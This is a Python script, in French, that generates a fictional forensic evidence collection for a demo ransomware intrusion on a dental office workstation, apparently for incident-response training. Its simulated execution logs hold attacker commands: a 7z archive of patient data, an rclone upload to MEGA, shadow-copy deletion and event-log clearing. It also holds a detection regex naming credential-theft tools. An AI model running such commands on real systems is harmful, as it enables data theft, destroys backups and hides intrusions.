"""Collecte FICTIVE de demonstration (aucune donnee reelle).

Scenario : poste SECRETARIAT-01 d'un cabinet dentaire fictif, RDP expose sur Internet,
force brute pendant 4 semaines, intrusion la nuit du 16 au 17/11/2026, vol d'identifiants,
creation d'un compte, archive 7z, envoi de 1,7 Go avec rclone, chiffrement.
Adresses : plages de documentation (RFC 5737 : 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24),
domaines en .example (RFC 2606). Une base de geolocalisation fictive les rattache a des pays.
"""
from __future__ import annotations

import csv
import gzip
import hashlib
import io
import json
import random
import shutil
from datetime import datetime, timedelta
from pathlib import Path

ICI = Path(__file__).resolve().parent
RACINE = ICI / "demo" / "Collecte"
BASES = ICI / "demo" / "bases"
POSTE = "SECRETARIAT-01_20261117_150121"
F = "%Y-%m-%d %H:%M:%S"
R = random.Random(20261117)

ATT = "203.0.113.170"       # attaquant (hebergeur VPN, RO)
C2 = "203.0.113.172"
PRAT = "198.51.100.23"      # praticienne depuis chez elle (FAI, FR)
TECH = "100.64.12.5"        # technicien via NetBird (VPN/CGNAT)
BRUTE = [("203.0.113.40", 1310), ("203.0.113.41", 960), ("203.0.113.75", 720), ("203.0.113.76", 610), ("203.0.113.98", 540),
         ("203.0.113.130", 470), ("203.0.113.133", 380), ("203.0.113.201", 350), ("203.0.113.205", 260), ("203.0.113.6", 240),
         ("203.0.113.9", 190), ("192.0.2.14", 160), ("192.0.2.77", 140), ("192.0.2.140", 120), ("192.0.2.200", 90),
         ("203.0.113.170", 210), ("198.51.100.200", 60), ("192.0.2.31", 45)]
GEO = [("192.0.2.0", "192.0.2.63", "64496", "CN", "DEMO-CHINANET-HOSTING"), ("192.0.2.64", "192.0.2.127", "64497", "VN", "DEMO-VIETTEL-SERVER"),
       ("192.0.2.128", "192.0.2.191", "64498", "BR", "DEMO-CLOUD-BR"), ("192.0.2.192", "192.0.2.255", "64499", "US", "DEMO-DIGITALOCEAN-LIKE VPS"),
       ("198.51.100.0", "198.51.100.127", "64500", "FR", "DEMO Orange (FAI grand public)"), ("198.51.100.128", "198.51.100.255", "64501", "DE", "DEMO-HETZNER-LIKE HOSTING"),
       ("203.0.113.0", "203.0.113.31", "64502", "NL", "DEMO-SERVERIUS-LIKE HOSTING"), ("203.0.113.32", "203.0.113.63", "64503", "RU", "DEMO-AEZA-LIKE VPS"),
       ("203.0.113.64", "203.0.113.127", "64504", "RU", "DEMO-RU-DATACENTER"), ("203.0.113.128", "203.0.113.159", "64505", "CN", "DEMO-CN-CLOUD"),
       ("203.0.113.160", "203.0.113.191", "64506", "RO", "DEMO-M247-LIKE VPN HOSTING"), ("203.0.113.192", "203.0.113.255", "64507", "SG", "DEMO-SG-VPS")]
VILLES = {"64500": ("Rennes", 48.11, -1.68), "64506": ("Bucarest", 44.43, 26.10), "64503": ("Moscou", 55.75, 37.62), "64504": ("Saint-Petersbourg", 59.93, 30.36),
          "64502": ("Amsterdam", 52.37, 4.90), "64496": ("Shanghai", 31.23, 121.47), "64497": ("Hanoi", 21.03, 105.85), "64498": ("Sao Paulo", -23.55, -46.63),
          "64499": ("New York", 40.71, -74.0), "64501": ("Falkenstein", 50.48, 12.37), "64505": ("Pekin", 39.90, 116.40), "64507": ("Singapour", 1.35, 103.82)}
SHA = {n: hashlib.sha256(f"demo-{n}".encode()).hexdigest().upper() for n in ("rclone", "netscan", "mimi", "netpass", "svhost")}
SHA1 = {n: hashlib.sha1(f"demo-{n}".encode()).hexdigest().upper() for n in SHA}


def d(s):
    return datetime.strptime(s, F)


def tip(ip):
    if ip.startswith(("192.168.", "10.")):
        return "Privee"
    if ip.startswith("100.64."):
        return "VPN/CGNAT"
    return "PUBLIQUE"


def ecrire(chemin: Path, lignes: list[dict], colonnes: list[str] | None = None, guillemets=True):
    chemin.parent.mkdir(parents=True, exist_ok=True)
    if not lignes:
        chemin.write_text("Aucune ligne\n", encoding="utf-8-sig")
        return
    colonnes = colonnes or list(lignes[0].keys())
    with open(chemin, "w", encoding="utf-8-sig", newline="") as f:
        w = csv.DictWriter(f, fieldnames=colonnes, quoting=csv.QUOTE_ALL if guillemets else csv.QUOTE_MINIMAL, extrasaction="ignore")
        w.writeheader()
        for l in lignes:
            w.writerow({k: ("" if v is None else v) for k, v in l.items()})


FEN = [("F1", "2026-11-05 20:11:00", "2026-11-05 22:22:00", f"session dr.lilas depuis IP publique {PRAT}"),
       ("F2", "2026-11-10 13:30:00", "2026-11-10 14:55:00", f"session technicien depuis {TECH} (plage VPN/CGNAT, NetBird ?)"),
       ("F3", "2026-11-12 20:33:00", "2026-11-12 22:40:00", f"session dr.lilas depuis IP publique {PRAT}"),
       ("F4", "2026-11-16 23:12:00", "2026-11-17 03:28:00", f"session secretariat depuis IP publique {ATT}")]


def fen_de(t: datetime) -> str:
    return ",".join(i for i, a, b, _ in FEN if d(a) <= t <= d(b))


def generer(force: bool = False) -> Path:
    col = RACINE / POSTE
    if col.is_dir() and not force and (col / "manifeste_sha256.csv").is_file():
        return col
    if RACINE.exists():
        shutil.rmtree(RACINE)
    if BASES.exists():
        shutil.rmtree(BASES)
    ana = RACINE / (POSTE + "_analyse")
    col.mkdir(parents=True)
    ana.mkdir(parents=True)
    P = lambda rel: col / rel.replace("\\", "/")
    A = lambda rel: ana / rel

    # ------------------------------------------------------------ connexions
    echecs = []
    debut_bf = d("2026-10-20 02:00:00")
    comptes_essayes = ["administrateur", "admin", "user", "secretariat", "accueil", "test", "scanner", "comptabilite", "dentiste"]
    for ip, n in BRUTE:
        t = debut_bf + timedelta(hours=R.randint(0, 500))
        for _ in range(n):
            t += timedelta(seconds=R.randint(20, 900))
            if t > d("2026-11-16 23:40:00"):
                t = d("2026-11-16 23:40:00") - timedelta(seconds=R.randint(60, 900000))
            echecs.append({"Date": t.strftime(F), "Type": "3", "Compte": "\\" + R.choice(comptes_essayes), "IP": ip, "Poste": R.choice(["-", "WIN-" + str(R.randint(1000, 9999))]),
                           "Statut": "0xc000006d", "SousStatut": R.choice(["0xc0000064", "0xc000006a"])})
    echecs.sort(key=lambda r: r["Date"])
    ecrire(P("connexions\\echecs_connexion_4625.csv"), echecs)
    par_ip = {}
    for e in echecs:
        par_ip.setdefault(e["IP"], []).append(e)
    ecrire(P("connexions\\echecs_par_ip.csv"), sorted(({"IP": ip, "TypeIP": "PUBLIQUE", "NbEchecs": len(v), "Premier": v[0]["Date"], "Dernier": v[-1]["Date"],
                                                         "Comptes": " ; ".join(sorted({x["Compte"] for x in v})[:15]), "Postes": " ; ".join(sorted({x["Poste"] for x in v})[:5])}
                                                        for ip, v in par_ip.items()), key=lambda r: -r["NbEchecs"]))
    logons = []
    for jour in range(29):
        j = d("2026-10-20 08:31:00") + timedelta(days=jour)
        if j.weekday() < 5:
            logons.append({"Date": (j + timedelta(minutes=R.randint(0, 9))).strftime(F), "Type": "7", "Compte": "CABINET\\secretariat", "IP": "-", "TypeIP": "-", "Poste": "SECRETARIAT-01",
                           "Processus": "C:\\Windows\\System32\\svchost.exe", "Authentification": "Negotiate", "Eleve": "%%1843", "LogonId": hex(R.randint(10 ** 6, 10 ** 7))})
            for _ in range(3):
                logons.append({"Date": (j + timedelta(minutes=R.randint(0, 600))).strftime(F), "Type": "3", "Compte": "CABINET\\nas-sauvegarde", "IP": "192.168.1.20", "TypeIP": "Privee",
                               "Poste": "NAS-CABINET", "Processus": "-", "Authentification": "NTLM", "Eleve": "%%1842", "LogonId": hex(R.randint(10 ** 6, 10 ** 7))})
    sessions_rdp = [("2026-11-05 20:41:12", "2026-11-05 21:52:40", "CABINET\\dr.lilas", PRAT, "PUBLIQUE"),
                    ("2026-11-10 14:00:31", "2026-11-10 14:25:02", "CABINET\\technicien", TECH, "VPN/CGNAT"),
                    ("2026-11-12 21:03:05", "2026-11-12 22:10:44", "CABINET\\dr.lilas", PRAT, "PUBLIQUE"),
                    ("2026-11-16 23:42:12", "2026-11-17 02:58:09", "CABINET\\secretariat", ATT, "PUBLIQUE")]
    for a, b, cpt, ip, ti in sessions_rdp:
        logons.append({"Date": a, "Type": "10", "Compte": cpt, "IP": ip, "TypeIP": ti, "Poste": "-", "Processus": "C:\\Windows\\System32\\svchost.exe",
                       "Authentification": "Negotiate", "Eleve": "%%1843", "LogonId": hex(R.randint(10 ** 6, 10 ** 7))})
    logons.sort(key=lambda r: r["Date"])
    ecrire(P("connexions\\ouvertures_session_4624.csv"), logons)
    ecrire(P("connexions\\rdp_authentifications_1149.csv"), [{"Date": (d(a) - timedelta(seconds=2)).strftime(F), "Utilisateur": cpt.split("\\")[1], "Domaine": "CABINET", "IP": ip}
                                                              for a, b, cpt, ip, ti in sessions_rdp])
    ecrire(P("connexions\\rdp_sessions_LSM.csv"), [x for a, b, cpt, ip, ti in sessions_rdp for x in (
        {"Date": a, "EventID": "21", "Action": "Ouverture session", "Utilisateur": cpt, "Session": "2", "IP": ip},
        {"Date": b, "EventID": "23", "Action": "Fermeture session", "Utilisateur": cpt, "Session": "2", "IP": ""})])
    ecrire(P("connexions\\identifiants_explicites_4648.csv"), [
        {"Date": "2026-11-17 00:11:30", "Auteur": "CABINET\\secretariat", "CompteUtilise": "CABINET\\nas-sauvegarde", "Serveur": "NAS-CABINET", "IP": "192.168.1.20", "Processus": "C:\\Windows\\explorer.exe"}])
    succes = [(ATT, 4, "2026-11-16 23:41:55", "2026-11-16 23:42:14", "RDP 131 (connexion TCP) ; RDP 1149 ; 4624 type 10 ; RDP LSM 21", "secretariat ; CABINET\\secretariat"),
              (PRAT, 8, "2026-11-05 20:41:10", "2026-11-12 21:03:05", "RDP 1149 ; 4624 type 10 ; RDP LSM 21", "dr.lilas ; CABINET\\dr.lilas"),
              (TECH, 3, "2026-11-10 14:00:29", "2026-11-10 14:00:31", "RDP 1149 ; 4624 type 10", "technicien ; CABINET\\technicien"),
              ("192.168.1.20", 60, "2026-10-20 08:40:00", "2026-11-16 18:10:00", "4624 type 3", "CABINET\\nas-sauvegarde")]
    ecrire(P("connexions\\synthese_ip_connexions_reussies.csv"), [{"IP": ip, "TypeIP": tip(ip), "NbEvenements": n,
                                                                   "Premier": a, "Dernier": b, "Sources": s, "Comptes": cpt} for ip, n, a, b, s, cpt in succes])

    # ------------------------------------------------------------ comptes, antivirus, journaux
    ecrire(P("comptes\\evenements_comptes.csv"), [
        {"Date": "2026-11-17 00:21:07", "EventID": "4720", "Action": "Creation compte", "Auteur": "CABINET\\secretariat", "CibleOuGroupe": "SECRETARIAT-01\\support", "Membre": "", "Details": "SamAccountName=support"},
        {"Date": "2026-11-17 00:21:40", "EventID": "4732", "Action": "Ajout groupe local", "Auteur": "CABINET\\secretariat", "CibleOuGroupe": "Builtin\\Administrateurs", "Membre": "SECRETARIAT-01\\support", "Details": ""},
        {"Date": "2026-11-17 00:22:15", "EventID": "4732", "Action": "Ajout groupe local", "Auteur": "CABINET\\secretariat", "CibleOuGroupe": "Builtin\\Utilisateurs du Bureau a distance", "Membre": "SECRETARIAT-01\\support", "Details": ""}])
    ecrire(P("systeme\\defender_detections.csv"), [
        {"DetectionID": "{D1}", "ThreatID": "2147752183", "InitialDetectionTime": "2026-11-16 23:52:31", "LastThreatStatusChangeTime": "2026-11-16 23:52:40",
         "ProcessName": "C:\\Windows\\explorer.exe", "DomainUser": "CABINET\\secretariat", "Resources": "file:_C:\\Users\\Public\\Music\\mimi.exe", "ActionSuccess": "True"}])
    ecrire(P("systeme\\defender_menaces.csv"), [{"ThreatID": "2147752183", "ThreatName": "HackTool:Win32/Mimikatz.D", "SeverityID": "5", "IsActive": "False", "DidThreatExecute": "False", "Resources": "file:_C:\\Users\\Public\\Music\\mimi.exe"}])
    (P("systeme\\defender_preferences.txt")).write_text("ExclusionPath              : {C:\\Users\\Public\\Music}\nExclusionExtension         : \nExclusionProcess           : \nDisableRealtimeMonitoring  : False\n", encoding="utf-8")
    ecrire(P("evenements\\resume_evenements_cles.csv"), [
        {"Date": "2026-11-16 23:58:02", "Journal": "Microsoft-Windows-Windows Defender/Operational", "EventID": "5001", "Source": "Microsoft-Windows-Windows Defender", "Message": "La protection en temps reel est desactivee."},
        {"Date": "2026-11-16 23:59:40", "Journal": "Microsoft-Windows-Windows Defender/Operational", "EventID": "5007", "Source": "Microsoft-Windows-Windows Defender", "Message": "Configuration modifiee : Exclusions\\Paths\\C:\\Users\\Public\\Music"},
        {"Date": "2026-11-17 02:06:51", "Journal": "System", "EventID": "7045", "Source": "Service Control Manager", "Message": "Un service a ete installe : DemoSvcHost, C:\\Users\\Public\\Music\\svhost.exe"},
        {"Date": "2026-11-17 02:44:13", "Journal": "System", "EventID": "104", "Source": "Microsoft-Windows-Eventlog", "Message": "Le fichier journal System a ete efface."}])
    cov = [("Security", "oui", "2026-10-20 01:12:44", "2026-11-17 15:00:58"), ("System", "oui", "2026-11-17 02:44:13", "2026-11-17 15:00:12"),
           ("Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", "oui", "2026-08-02 08:31:00", "2026-11-17 14:58:10"),
           ("Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational", "oui", "2026-08-02 08:31:00", "2026-11-17 14:58:10"),
           ("Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "oui", "2026-10-29 10:02:00", "2026-11-17 14:58:10"),
           ("Microsoft-Windows-PowerShell/Operational", "oui", "2026-09-01 09:00:00", "2026-11-17 15:01:00"),
           ("Microsoft-Windows-Windows Defender/Operational", "oui", "2026-07-12 10:00:00", "2026-11-17 15:00:00"),
           ("Microsoft-Windows-SMBServer/Security", "NON", "", ""), ("Microsoft-Windows-Bits-Client/Operational", "oui", "2026-10-01 00:00:00", "2026-11-17 14:00:00"),
           ("Microsoft-Windows-DNS-Client/Operational", "NON", "", "")]
    lignes_cov = []
    for j, pr, a, b in cov:
        o = {"Journal": j, "Present": pr, "PremierEvt": a, "DernierEvt": b}
        for i, wa, wb, _ in FEN:
            o[i] = "absent" if not a else "couvert" if a <= wa and b >= wb else "NON COUVERT" if a > wb or b < wa else "partiel"
        lignes_cov.append(o)
    ecrire(A("journaux_couverture.csv"), lignes_cov)
    ecrire(P("evenements\\etat_journaux.csv"), [
        {"Journal": "Security", "Existe": "True", "Active": "True", "NbEvenements": "48211", "PlusAncien": "2026-10-20 01:12:44", "TailleMo": "20", "TailleMaxMo": "20", "Mode": "Circular"},
        {"Journal": "Microsoft-Windows-Sysmon/Operational", "Existe": "False", "Active": "", "NbEvenements": "", "PlusAncien": "", "TailleMo": "", "TailleMaxMo": "", "Mode": ""},
        {"Journal": "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall", "Existe": "True", "Active": "False", "NbEvenements": "0", "PlusAncien": "", "TailleMo": "1", "TailleMaxMo": "1", "Mode": "Circular"},
        {"Journal": "Microsoft-Windows-DNS-Client/Operational", "Existe": "True", "Active": "False", "NbEvenements": "0", "PlusAncien": "", "TailleMo": "1", "TailleMaxMo": "1", "Mode": "Circular"},
        {"Journal": "Microsoft-Windows-TerminalServices-PnPDevices/Admin", "Existe": "True", "Active": "True", "NbEvenements": "12", "PlusAncien": "2026-09-14 10:00:00", "TailleMo": "1", "TailleMaxMo": "1", "Mode": "Circular"}])
    ecrire(P("reseau\\parefeu_journalisation.csv"), [{"Name": n, "Enabled": "True", "DefaultOutboundAction": "NotConfigured", "LogAllowed": "False", "LogBlocked": "False",
                                                     "LogIgnored": "NotConfigured", "LogFileName": "%systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log", "LogMaxSizeKilobytes": "4096", "FichierPresent": "False"}
                                                    for n in ("Domain", "Private", "Public")])

    # ------------------------------------------------------------ executions
    ex = []
    for jour in range(29):
        j = d("2026-10-20 08:35:00") + timedelta(days=jour)
        if j.weekday() >= 5:
            continue
        for prog, chemin in (("CHROME.EXE", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"), ("OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
                             ("LOGOS_W.EXE", "D:\\LOGOS_W\\LOGOS_W.EXE"), ("SRSTREAMER.EXE", "C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRStreamer.exe"),
                             ("ACRORD32.EXE", "C:\\Program Files\\Adobe\\Acrobat Reader\\AcroRd32.exe")):
            t = j + timedelta(minutes=R.randint(0, 480))
            ex.append({"Date": t.strftime(F), "Source": "Prefetch (execution)", "Programme": prog, "Chemin": chemin, "Compte": "", "Detail": f"RunCount={R.randint(20, 900)}", "SHA1": ""})
    attaque = [("2026-11-16 23:47:20", "Prefetch (execution)", "NETSCAN.EXE", "C:\\Users\\Public\\Music\\netscan.exe", "", ""),
               ("2026-11-16 23:47:19", "Amcache (inventaire, ~1re execution)", "netscan.exe", "c:\\users\\public\\music\\netscan.exe", "", SHA1["netscan"]),
               ("2026-11-17 00:03:12", "Prefetch (execution)", "MIMI.EXE", "C:\\Users\\Public\\Music\\mimi.exe", "", ""),
               ("2026-11-17 00:09:45", "Prefetch (execution)", "NETPASS.EXE", "C:\\Users\\Public\\Music\\netpass.exe", "", ""),
               ("2026-11-17 00:09:44", "Amcache (inventaire, ~1re execution)", "netpass.exe", "c:\\users\\public\\music\\netpass.exe", "", SHA1["netpass"]),
               ("2026-11-17 00:27:03", "Prefetch (execution)", "7Z.EXE", "C:\\Program Files\\7-Zip\\7z.exe", "", ""),
               ("2026-11-17 00:27:03", "4688 creation de processus", "7z.exe", "C:\\Program Files\\7-Zip\\7z.exe", "secretariat", "7z.exe a -mx5 -p**** C:\\Users\\Public\\Music\\b.7z D:\\LOGOS_W\\DATA"),
               ("2026-11-17 00:41:30", "Prefetch (execution)", "RCLONE.EXE", "C:\\Users\\Public\\Music\\rclone.exe", "", ""),
               ("2026-11-17 00:41:29", "Amcache (inventaire, ~1re execution)", "rclone.exe", "c:\\users\\public\\music\\rclone.exe", "", SHA1["rclone"]),
               ("2026-11-17 00:41:30", "4688 creation de processus", "rclone.exe", "C:\\Users\\Public\\Music\\rclone.exe", "secretariat", "rclone.exe copy C:\\Users\\Public\\Music\\b.7z mega:sauv --transfers 8"),
               ("2026-11-17 02:12:08", "4688 creation de processus", "vssadmin.exe", "C:\\Windows\\System32\\vssadmin.exe", "support", "vssadmin.exe delete shadows /all /quiet"),
               ("2026-11-17 02:14:40", "Prefetch (execution)", "SVHOST.EXE", "C:\\Users\\Public\\Music\\svhost.exe", "", ""),
               ("2026-11-17 02:14:39", "Amcache (inventaire, ~1re execution)", "svhost.exe", "c:\\users\\public\\music\\svhost.exe", "", SHA1["svhost"]),
               ("2026-11-17 02:44:12", "4688 creation de processus", "wevtutil.exe", "C:\\Windows\\System32\\wevtutil.exe", "support", "wevtutil.exe cl System"),
               ("2026-11-05 20:45:10", "Prefetch (execution)", "LOGOS_W.EXE", "D:\\LOGOS_W\\LOGOS_W.EXE", "", "RunCount=812"),
               ("2026-11-12 21:06:41", "Prefetch (execution)", "LOGOS_W.EXE", "D:\\LOGOS_W\\LOGOS_W.EXE", "", "RunCount=835"),
               ("2026-11-10 14:03:00", "Prefetch (execution)", "NETBIRD.EXE", "C:\\Program Files\\NetBird\\netbird.exe", "", "RunCount=44")]
    for t, s, p, ch, cpt, det in attaque:
        ex.append({"Date": t, "Source": s, "Programme": p, "Chemin": ch, "Compte": cpt, "Detail": det if "Amcache" not in s else "", "SHA1": det if "Amcache" in s else ""})
    import re as _re
    outil = _re.compile(r"(?i)mimikatz|mimi\.exe|netpass|rclone|netscan|7z|vssadmin|splashtop|srstreamer|netbird|wevtutil")
    for e in ex:
        e["Fenetre"] = fen_de(d(e["Date"]))
        e["OutilSensible"] = "OUI" if outil.search(e["Programme"] + " " + e["Chemin"]) else ""
    ex.sort(key=lambda e: e["Date"])
    cols = ["Date", "Source", "Programme", "Chemin", "Compte", "Detail", "SHA1", "Fenetre", "OutilSensible"]
    ecrire(A("executions_chronologie.csv"), ex, cols)
    ecrire(A("executions_fenetres.csv"), [e for e in ex if e["Fenetre"]], cols)
    ecrire(A("executions_outils_sensibles.csv"), [e for e in ex if e["OutilSensible"]], cols)
    ecrire(P("rancon\\commandes_destructrices_4688.csv"), [{"Date": "2026-11-17 02:12:08", "Compte": "SECRETARIAT-01\\support", "Processus": "C:\\Windows\\System32\\vssadmin.exe",
                                                           "CommandLine": "vssadmin.exe delete shadows /all /quiet"}])

    # ------------------------------------------------------------ sessions, fenetres
    ses = [{"Debut": a, "Fin": b, "DureeMin": round((d(b) - d(a)).total_seconds() / 60, 1), "FinPar": "23 fermeture" if ip != TECH else "4634",
            "Compte": cpt.split("\\")[1], "Type": "RDP (LSM)", "IP": ip, "TypeIP": ti, "Poste": "", "Session": "LSM 2", "Source": "LocalSessionManager",
            "Evenements": "21 | 24 deconnexion 02:46" if ip == ATT else "21"} for a, b, cpt, ip, ti in sessions_rdp]
    for jour in range(29):
        j = d("2026-10-20 08:31:00") + timedelta(days=jour)
        if j.weekday() < 5:
            ses.append({"Debut": j.strftime(F), "Fin": (j + timedelta(hours=10, minutes=R.randint(0, 50))).strftime(F), "DureeMin": "", "FinPar": "estimee : 4647 deconnexion de secretariat",
                        "Compte": "secretariat", "Type": "4624 type 2", "IP": "-", "TypeIP": "-", "Poste": "SECRETARIAT-01", "Session": "", "Source": "Security", "Evenements": ""})
    ses.sort(key=lambda r: r["Debut"])
    ecrire(A("sessions_reconstituees.csv"), ses)
    ecrire(A("fenetres_analyse.csv"), [{"Id": i, "Debut": a, "Fin": b, "DureeMin": round((d(b) - d(a)).total_seconds() / 60), "Motif": m} for i, a, b, m in FEN])

    # ------------------------------------------------------------ SRUM
    tot, brut, refapp = [], [], {}
    t = d("2026-10-10 00:00:00")
    fin = d("2026-11-17 14:00:00")
    while t <= fin:
        ouvert = (t.weekday() < 5 and 8 <= t.hour < 19) or (t.weekday() == 5 and 8 <= t.hour < 12)
        apps = {"chrome.exe": R.uniform(3, 22) if ouvert else R.uniform(0, 0.3), "outlook.exe": R.uniform(0.5, 6) if ouvert else R.uniform(0, 0.2),
                "onedrive.exe": R.uniform(0, 35) if ouvert and R.random() < 0.3 else 0, "svchost.exe": R.uniform(0.2, 2.5),
                "logos_w.exe": R.uniform(0.2, 1.5) if ouvert else 0, "srstreamer.exe": R.uniform(0, 3) if ouvert and R.random() < 0.15 else 0}
        recu = {k: v * R.uniform(3, 12) for k, v in apps.items()}
        fe = fen_de(t - timedelta(minutes=30))
        if fe in ("F1", "F3"):
            apps["TermService"] = R.uniform(12, 24)
        if fe == "F2":
            apps["netbird.exe"] = R.uniform(4, 9)
            apps["TermService"] = R.uniform(10, 25)
        if t == d("2026-11-17 00:00:00"):
            apps["TermService"] = 41.2
        if t == d("2026-11-17 01:00:00"):
            apps.update({"TermService": 44.8, "rclone.exe": 612.4, "chrome.exe": 3.1})
        if t == d("2026-11-17 02:00:00"):
            apps.update({"TermService": 39.5, "rclone.exe": 1138.7})
        if t == d("2026-11-17 03:00:00"):
            apps.update({"TermService": 8.2, "svhost.exe": 0.4})
        apps = {k: round(v, 2) for k, v in apps.items() if v > 0}
        top = max(apps, key=apps.get)
        tot.append({"Releve": t.strftime(F), "EnvoyeMo": round(sum(apps.values()), 2), "RecuMo": round(sum(recu.values()), 2), "PremiereAppliEnvoi": top,
                    "PremiereAppliEnvoyeMo": apps[top], "Fenetre": fen_de(t - timedelta(minutes=30))})
        for k, v in apps.items():
            brut.append({"Releve": t.strftime(F), "App": k, "Utilisateur": "secretariat", "Interface": "1689399632855040", "EnvoyeOctets": int(v * 1048576),
                         "RecuOctets": int(recu.get(k, 0) * 1048576), "Fenetre": fen_de(t)})
            if d("2026-10-15 00:00:00") <= t < d("2026-11-05 20:11:00"):
                refapp.setdefault(k, []).append(v)
        t += timedelta(hours=1)
    ecrire(A("srum_total_par_releve.csv"), tot)
    ecrire(A("srum_reseau_brut.csv"), brut)
    ecrire(A("srum_30_plus_gros_envois.csv"), sorted(tot, key=lambda r: -r["EnvoyeMo"])[:30])
    reft = sorted(r["EnvoyeMo"] for r in tot if d("2026-10-15 00:00:00") <= d(r["Releve"]) < d("2026-11-05 20:11:00"))

    def stats(v):
        v = sorted(v)
        return {"NbReleves": len(v), "MoyenneEnvoyeMo": round(sum(v) / len(v), 2), "P95EnvoyeMo": round(v[max(0, int(len(v) * 0.95) - 1)], 2), "MaxEnvoyeMo": round(v[-1], 2),
                "MoyenneRecuMo": round(sum(v) / len(v) * 6, 2), "MaxRecuMo": round(v[-1] * 9, 2)}
    ref_tot = {"App": "(TOTAL toutes applis)", **stats(reft)}
    ecrire(A("srum_reference_par_app.csv"), [ref_tot] + [{"App": k, **stats(v)} for k, v in sorted(refapp.items(), key=lambda x: -max(x[1]))])
    cmp_ = []
    refs = {k: stats(v) for k, v in refapp.items()}
    for i, a, b, _ in FEN:
        for r in tot:
            tr = d(r["Releve"])
            if d(a) < tr <= d(b).replace(minute=0, second=0) + timedelta(hours=1):
                ec = "AU-DESSUS DU MAX DE REFERENCE" if r["EnvoyeMo"] > ref_tot["MaxEnvoyeMo"] else "au-dessus du 95e centile" if r["EnvoyeMo"] > ref_tot["P95EnvoyeMo"] else ""
                cmp_.append({"Fenetre": i, "Releve": r["Releve"], "App": "(TOTAL toutes applis)", "EnvoyeMo": r["EnvoyeMo"], "RecuMo": r["RecuMo"],
                             "RefMoyenneEnvoyeMo": ref_tot["MoyenneEnvoyeMo"], "RefP95EnvoyeMo": ref_tot["P95EnvoyeMo"], "RefMaxEnvoyeMo": ref_tot["MaxEnvoyeMo"], "Ecart": ec})
                for x in brut:
                    if x["Releve"] == r["Releve"]:
                        mo = round(x["EnvoyeOctets"] / 1048576, 2)
                        rs = refs.get(x["App"])
                        ec = "APPLI ABSENTE DE LA REFERENCE" if not rs else "AU-DESSUS DU MAX DE REFERENCE" if mo > rs["MaxEnvoyeMo"] else ""
                        cmp_.append({"Fenetre": i, "Releve": r["Releve"], "App": x["App"], "EnvoyeMo": mo, "RecuMo": round(x["RecuOctets"] / 1048576, 2),
                                     "RefMoyenneEnvoyeMo": rs["MoyenneEnvoyeMo"] if rs else "", "RefP95EnvoyeMo": rs["P95EnvoyeMo"] if rs else "", "RefMaxEnvoyeMo": rs["MaxEnvoyeMo"] if rs else "", "Ecart": ec})
    ecrire(A("srum_fenetres_vs_reference.csv"), cmp_)

    # ------------------------------------------------------------ navigation, fichiers
    nav = []
    for jour in range(29):
        j = d("2026-10-20 08:50:00") + timedelta(days=jour)
        if j.weekday() < 5:
            for u, tt, cat in (("https://pro.doctolib.example/calendar", "Agenda - Doctolib (demo)", "SANTE / METIER"), ("https://espacepro.ameli.example/", "amelipro", "SANTE / METIER"),
                               ("https://mail.cabinet-lilas.example/", "Messagerie", "MESSAGERIE"), ("https://www.meteo.example/rennes", "Meteo Rennes", "")):
                nav.append({"Date": (j + timedelta(minutes=R.randint(0, 500))).strftime(F), "Utilisateur": "secretariat", "Navigateur": "chrome", "Categorie": cat, "Url": u, "Titre": tt})
    nav += [{"Date": "2026-11-17 00:15:22", "Utilisateur": "secretariat", "Navigateur": "chrome", "Categorie": "SANTE / METIER", "Url": "https://pro.doctolib.example/calendar?view=week", "Titre": "Agenda - Doctolib (demo)"},
            {"Date": "2026-11-17 00:16:05", "Utilisateur": "secretariat", "Navigateur": "chrome", "Categorie": "SANTE / METIER", "Url": "https://pro.doctolib.example/patients", "Titre": "Patients - Doctolib (demo)"},
            {"Date": "2026-11-17 00:36:40", "Utilisateur": "secretariat", "Navigateur": "chrome", "Categorie": "OUTILS / ACCES DISTANT", "Url": "https://rclone.org/downloads/", "Titre": "Rclone downloads"},
            {"Date": "2026-11-17 01:05:12", "Utilisateur": "secretariat", "Navigateur": "chrome", "Categorie": "PARTAGE / TRANSFERT", "Url": "https://mega.nz/fm/demo", "Titre": "MEGA"},
            {"Date": "2026-11-17 01:44:51", "Utilisateur": "secretariat", "Navigateur": "chrome", "Categorie": "PARTAGE / TRANSFERT", "Url": "https://mega.nz/fm/demo", "Titre": "MEGA"}]
    for n in nav:
        n["Fenetre"] = fen_de(d(n["Date"]))
    nav.sort(key=lambda r: r["Date"])
    cols = ["Date", "Utilisateur", "Navigateur", "Categorie", "Url", "Titre", "Fenetre"]
    ecrire(A("navigation_complete.csv"), nav, cols)
    ecrire(A("navigation_fenetres.csv"), [n for n in nav if n["Fenetre"]], cols)
    ecrire(A("navigation_sites_sensibles.csv"), [n for n in nav if n["Categorie"]], cols)
    ecrire(A("telechargements.csv"), [{"Date": "2026-11-17 00:37:02", "Utilisateur": "secretariat", "Navigateur": "chrome", "Fichier": "C:\\Users\\secretariat\\Downloads\\rclone-v1.68.2-windows-amd64.zip",
                                       "Url": "https://downloads.rclone.org/v1.68.2/rclone-v1.68.2-windows-amd64.zip", "Octets": "22514820", "Fenetre": "F4"}])
    usn = [{"Date": "2026-11-17 00:27:05", "Volume": "C", "Fichier": "b.7z", "Raison": "FILE_CREATE", "Fenetre": "F4", "Archive": "OUI"},
           {"Date": "2026-11-17 00:39:58", "Volume": "C", "Fichier": "b.7z", "Raison": "DATA_EXTEND | CLOSE", "Fenetre": "F4", "Archive": "OUI"},
           {"Date": "2026-11-17 00:37:30", "Volume": "C", "Fichier": "rclone.exe", "Raison": "FILE_CREATE", "Fenetre": "F4", "Archive": ""}]
    t = d("2026-11-17 02:15:00")
    for k in range(900):
        t += timedelta(seconds=R.randint(1, 3))
        usn.append({"Date": t.strftime(F), "Volume": "D", "Fichier": f"[document {k}].DEMOLOCK", "Raison": "RENAME_NEW_NAME", "Fenetre": "F4", "Archive": ""})
    ecrire(A("usn_fenetres.csv"), usn)
